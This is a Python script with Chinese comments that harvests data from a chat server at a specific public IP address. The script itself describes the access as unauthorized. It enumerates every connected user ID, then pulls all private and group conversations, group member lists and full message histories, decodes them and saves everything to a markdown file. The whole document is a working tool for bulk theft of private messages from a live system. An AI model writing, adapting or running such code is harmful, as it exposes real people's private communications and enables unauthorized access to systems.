# -*- coding: utf-8 -*-
import json, base64, time, datetime, urllib.request, urllib.parse, urllib.error, sys

BASE = "http://43.198.164.35:5300"
TS   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
OUT  = f"43.198.164.35_聊天记录全量_{TS}.md"
PAGE = 100

def log(m): print(m, file=sys.stderr, flush=True)

def req(path, tries=3, timeout=30):
    last = None
    for i in range(tries):
        try:
            with urllib.request.urlopen(BASE + path, timeout=timeout) as r:
                return json.loads(r.read().decode())
        except Exception as e:
            last = e
            if i < tries - 1:
                time.sleep(0.5 * (i + 1))   # 简单退避
    raise last  # 三次都失败才抛出

def take_uid(it):
    if isinstance(it, dict):
        for k in ("uid", "user_id"):
            if it.get(k) is not None: return it[k]
    elif isinstance(it, (str, int)): return it
    return None

def find(obj, key):
    out = []
    def walk(o):
        if isinstance(o, list):
            for x in o: walk(x)
        elif isinstance(o, dict):
            if o.get(key) is not None: out.append(o)
            else:
                for v in o.values(): walk(v)
    walk(obj)
    return out

def fetch_msgs(channel_id, ctype, limit=100):
    msgs, cursor, guard = [], 0, 0
    while guard < 300:
        q = urllib.parse.urlencode({"channel_id": channel_id, "channel_type": ctype,
                                   "limit": limit, "last_message_seq": cursor})
        try:
            d = req("/api/messages?" + q)
        except Exception as e:
            log(f"    [!] /api/messages 失败 cid={channel_id} cursor={cursor}: {e}")
            break
        arr = d.get("data") if isinstance(d, dict) else d
        if not isinstance(arr, list) or not arr:
            break
        msgs += arr
        mx = arr[-1].get("seq") if isinstance(arr[-1], dict) else None
        mx = mx or ((d or {}).get("max_message_seq") if isinstance(d, dict) else None) or cursor
        if mx == cursor or len(arr) < limit:
            break
        cursor = mx
        guard += 1
    return msgs

def b64_to_text(v):
    if isinstance(v, (dict, list)): return v
    if not isinstance(v, str): return str(v)
    try:
        dec = base64.b64decode(v, validate=False).decode("utf-8", "replace")
        o = json.loads(dec)
        if isinstance(o, dict):
            for k in ("content", "text", "msg", "body"):
                if o.get(k) is not None: return o[k]
            return dec
        return dec
    except Exception:
        return v

def norm(m):
    if not isinstance(m, dict): return {"time":"-","who":"-","content":b64_to_text(m)}
    t = m.get("timestamp") or m.get("time") or m.get("create_at") or m.get("created_at")
    try: t = datetime.datetime.fromtimestamp(int(t)).isoformat(timespec="seconds")
    except Exception: t = t if t is not None else "-"
    who = (m.get("sender") or m.get("from") or m.get("from_user")
           or m.get("nickname") or m.get("uid") or m.get("userId") or "-")
    body = m.get("payload")
    if body is None:
        for k in ("content","text","body","msg"):
            if m.get(k) is not None: body = m[k]; break
    return {"time":t,"who":who,"content": b64_to_text(body) if body is not None else json.dumps(m, ensure_ascii=False)}

# 1) 全量 uid
uids, seen = [], set()
def fetch_uids():
    off, lim = 0, 200
    while True:
        try:
            d = req("/api/connz?" + urllib.parse.urlencode({"offset":off,"limit":lim}))
        except Exception as e:
            log(f"[!] connz 分页失败 off={off}: {e}"); break
        arr = d.get("connections") if isinstance(d, dict) else d
        if not isinstance(arr, list): arr = []
        for it in arr:
            u = take_uid(it)
            if u not in seen:
                seen.add(u); uids.append(u)
        total = d.get("total") if isinstance(d, dict) else len(arr)
        off += len(arr)
        if not arr or (total and off >= total): break
fetch_uids()
log(f"[+] 共 {len(uids)} 个 uid")

# 2) 逐 uid 逐 channel，隔离失败
lines = ["# 43.198.164.35:5300 未授权聊天记录全量导出","",
         f"- 目标: `{BASE}`",
         f"- 导出时间: {datetime.datetime.now().isoformat(timespec='seconds')}",
         f"- uid 总数: **{len(uids)}**","",
         "> channel_type: 1=私聊, 2=群聊；正文已 base64 解码",""]
P = G = M = err = 0
done = 0
for uid in uids:
    done += 1
    try:
        cv = req(f"/api/conversations?uid={uid}")
    except Exception as e:
        log(f"[!] uid={uid} conversations 失败: {e}"); err += 1
        lines += [f"## uid: `{uid}`", f"- ⚠️ 拉取失败: {e}", ""]
        continue
    chans = [c for c in find(cv,"channel_id") if c.get("channel_type") in (1,2)]
    if not chans:
        lines += [f"## uid: `{uid}`","- (无会话)",""]
        if done % 50 == 0: log(f"[{done}/{len(uids)}] 处理中…")
        continue
    lines.append(f"## uid: `{uid}`"); lines.append("")
    for c in sorted(chans, key=lambda x: -int(x.get("timestamp") or 0)):
        ctype, cid = c["channel_type"], c["channel_id"]
        kind = "私聊" if ctype==1 else "群聊"
        G += 1
        try:
            msgs = fetch_msgs(cid, ctype)
        except Exception as e:
            log(f"[!] cid={cid} fetch 异常: {e}"); err += 1
            msgs = []
        M += len(msgs)
        lines.append(f"### {kind} · `{cid}` · {len(msgs)} 条")
        lines.append("")
        if ctype==2:
            try:
                ch = req(f"/api/channels?channel_id={cid}&channel_type=2")
                ids = sorted({u for u in (take_uid(x) for x in (ch if isinstance(ch,list) else find(ch,"uid"))) if u})
                # ch 可能是 dict，取其内 uid
                if not ids and isinstance(ch, dict):
                    ids = sorted({u for u in (take_uid(x) for x in ch.values()) if u})
                if ids: lines += [f"- 成员({len(ids)}): {', '.join(map(str,ids))}",""]
            except Exception: pass
        for m in msgs:
            n = norm(m)
            lines.append(f"- `{n['time']}` **{n['who']}**: {n['content']}")
        lines.append("")
    if done % 50 == 0: log(f"[{done}/{len(uids)}] 消息累计 {M}")

lines += ["---", f"**统计: {len(uids)} uid / 会话 {G} / 消息 {M} / 失败 {err}** · 完成于 {datetime.datetime.now():%H:%M:%S}"]
open(OUT,"w",encoding="utf-8").write("\n".join(lines))
log(f"\n[+] 完成: 会话 {G}, 消息 {M}, 失败 {err}")
log(f"[+] 已保存到: {OUT}")
